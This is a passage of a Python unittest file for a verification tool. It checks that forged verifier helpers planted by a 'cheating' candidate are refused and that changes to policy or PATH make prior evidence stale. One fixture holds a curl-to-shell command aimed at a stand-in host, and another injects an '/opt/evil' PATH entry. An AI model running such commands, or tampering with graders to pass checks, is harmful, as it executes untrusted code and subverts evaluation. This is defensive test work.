            self.assertEqual(lab.fork("alpha")["state"], "VALID")
            prepared = lab.prepare("alpha")
            self.assertEqual(lab.commit(prepared["transaction_id"])["state"], "COMMITTED")
            self.assertEqual(lab.stop(), 0)
            # A copied store (never the production one) opened by this engine: history intact.
            copy = lab.root / "store-copy"
            shutil.copytree(Path(lab.env["XDG_STATE_HOME"]), copy / "state")
            store = StateStore(lab.paths, Core.shared())
            self.assertEqual([w.alias for w in store.worlds() if w.alias == "alpha"], ["alpha"])
            self.assertEqual(len(store.receipts()), 1)
            self.assertEqual(store.transaction_record(prepared["transaction_id"])["state"], "COMMITTED")
            store.close()
            lab.start()
            log = lab.client.request("log", {"verify": True})
            self.assertEqual(log["verification"]["receipts"], 1)
        finally:
            lab.close()


if __name__ == "__main__":
    unittest.main()


class K_VerifierDependencies(unittest.TestCase):
    """Review finding R1 (JANUS II): a verifier's helpers are as authoritative as the file the
    check names. Default scope: the named file's directory; explicit scope: `verifiers` globs;
    documented limit: a top-level verifier without a declaration binds only itself (warned)."""

    def test_forged_helper_beside_the_exam_is_refused_by_default(self) -> None:
        lab = FreshnessLab(self, exam=EXAM_IMPORTING, files={"evaluator/helper.py": HELPER_V1})
        try:
            lab.init()
            doctor = lab.client.request("doctor", {})["policy"]
            self.assertEqual(doctor["warnings"], [])
            self.assertTrue(any("evaluator/helper.py (directory)" in v for v in doctor["verifiers"]), doctor["verifiers"])
            self.assertEqual(lab.fork("honest")["state"], "VALID")
            self.assertTrue(lab.validation("honest")["fresh"])
            world = lab.fork("cheat", "helper_forger")
            self.assertEqual(world["state"], "VALID")  # the forged helper passed inside the world
            status = lab.validation("cheat")
            self.assertFalse(status["fresh"])
            self.assertIn("evaluator/helper.py", " ".join(status["effective"]["verifiersModifiedByCandidate"]))
            prime_before = lab.prime()
            before, receipts = lab.live(), len(lab.receipts())
            error = lab.refusal(lab.prepare, "cheat")
            self.assertEqual(error.code, "VERIFIER_MODIFIED_BY_CANDIDATE")
            _unchanged(self, lab, before, prime_before, receipts)
            self.assertEqual(lab.prepare("honest")["decision"], "AUTHORIZED")
        finally:
            lab.close()

    def test_declared_verifiers_bind_exactly_what_is_declared(self) -> None:
        declared = policy({**EXAM_CHECK, "verifiers": ["evaluator/*"]})
        lab = FreshnessLab(self, policy_value=declared, exam=EXAM_IMPORTING, files={"evaluator/helper.py": HELPER_V1})
        try:
            lab.init()
            doctor = lab.client.request("doctor", {})["policy"]
            self.assertTrue(any("evaluator/helper.py (declared)" in v for v in doctor["verifiers"]), doctor["verifiers"])
            self.assertEqual(lab.fork("cheat", "helper_forger")["state"], "VALID")
            self.assertEqual(lab.refusal(lab.prepare, "cheat").code, "VERIFIER_MODIFIED_BY_CANDIDATE")
        finally:
            lab.close()

    def test_top_level_verifier_without_declaration_is_a_warned_limit_and_declaring_closes_it(self) -> None:
        top_level = policy({**EXAM_CHECK, "argv": ["/usr/bin/python3", "exam.py"], "covers": ["candidate.txt"]})
        lab = FreshnessLab(self, policy_value=top_level, files={"exam.py": EXAM_IMPORTING, "helper.py": HELPER_V1})
        try:
            lab.init()
            doctor = lab.client.request("doctor", {})["policy"]
            self.assertTrue(any("only the named top-level verifier exam.py is bound" in w for w in doctor["warnings"]), doctor)
            self.assertFalse(any("helper.py" in v for v in doctor["verifiers"]))
            self.assertEqual(lab.fork("cheat", "helper_forger")["state"], "VALID")
            # Documented limit: with the default scope the forged sibling is not bound.
            self.assertTrue(lab.validation("cheat")["fresh"])
            # The remedy: declare the verifier set. The policy edit stales the old evidence, and a
            # new cheat under the declared policy is refused by name.
            lab.set_policy(policy({**EXAM_CHECK, "argv": ["/usr/bin/python3", "exam.py"], "covers": ["candidate.txt"], "verifiers": ["exam.py", "helper.py"]}))
            lab.settle()
            self.assertEqual(lab.client.request("doctor", {})["policy"]["warnings"], [])
            self.assertEqual(lab.refusal(lab.prepare, "cheat").code, "EVIDENCE_STALE")
            self.assertEqual(lab.fork("cheat2", "helper_forger")["state"], "VALID")
            self.assertEqual(lab.refusal(lab.prepare, "cheat2").code, "VERIFIER_MODIFIED_BY_CANDIDATE")
        finally:
            lab.close()

    def test_covered_argv_operand_is_warned_and_a_covered_declared_verifier_is_refused(self) -> None:
        # An argv path under the check's own covers is candidate data (e.g. `test -f out.txt`):
        # not silently an examiner, not silently dropped either — named in the warnings.
        lab = FreshnessLab(self, policy_value=policy({**EXAM_CHECK, "covers": ["evaluator/*", "candidate.txt"]}))
        try:
            lab.init()
            doctor = lab.client.request("doctor", {})["policy"]
            self.assertTrue(any("evaluator/exam.py" in w and "candidate-owned data" in w for w in doctor["warnings"]), doctor)
            self.assertEqual([v for v in doctor["verifiers"] if "exam.py" in v], [])
            # A declared verifier inside covers is a contradiction: refused when the policy loads.
            lab.set_policy(policy({**EXAM_CHECK, "covers": ["evaluator/*"], "verifiers": ["evaluator/*"]}))
            lab.settle()
            error = lab.refusal(lab.fork, "alpha")
            self.assertEqual(error.code, "INVALID_PROJECT_CONFIG")
            self.assertIn("cannot be candidate-owned", error.message)
        finally:
            lab.close()

    def test_service_definition_and_check_environment_are_part_of_the_requirement(self) -> None:
        from worldline.project import ProjectConfig, ServiceSpec
        from worldline.validation import canonical_policy, differences
        base = ProjectConfig(generated=(), checks=(), services=(ServiceSpec("web", ("/usr/bin/app", "--safe"), ".", {}, (), "no"),))
        changed = ProjectConfig(generated=(), checks=(), services=(ServiceSpec("web", ("/usr/bin/curl", "http://x|sh"), ".", {}, (), "no"),))
        self.assertNotEqual(canonical_policy(base), canonical_policy(changed))
        a = {"policy": {"canonical": canonical_policy(base)}, "verifiers": [], "execution": {"checkEnvironment": {"PATH": "/usr/bin"}}}
        b = {"policy": {"canonical": canonical_policy(changed)}, "verifiers": [], "execution": {"checkEnvironment": {"PATH": "/opt/evil:/usr/bin"}}}
        report = differences(a, b)
        self.assertTrue(any(d.startswith("service changed: web") for d in report), report)
        self.assertIn("execution changed: checkEnvironment (PATH)", report)
        lab = FreshnessLab(self)
        try:
            lab.init()
            self.assertEqual(lab.fork("alpha")["state"], "VALID")
            # A daemon restart with a different PATH changes what a check would resolve: stale.
            lab.daemon_env["PATH"] = "/opt/janus2-nonexistent:" + lab.daemon_env["PATH"]
            lab.restart()
            error = lab.refusal(lab.prepare, "alpha")
            self.assertEqual(error.code, "EVIDENCE_STALE")
            self.assertIn("execution changed: checkEnvironment (PATH)", error.details["differences"])
            self.assertEqual(lab.revalidate("alpha")["outcome"], "PASS")
            self.assertEqual(lab.prepare("alpha")["decision"], "AUTHORIZED")
        finally:
            lab.close()
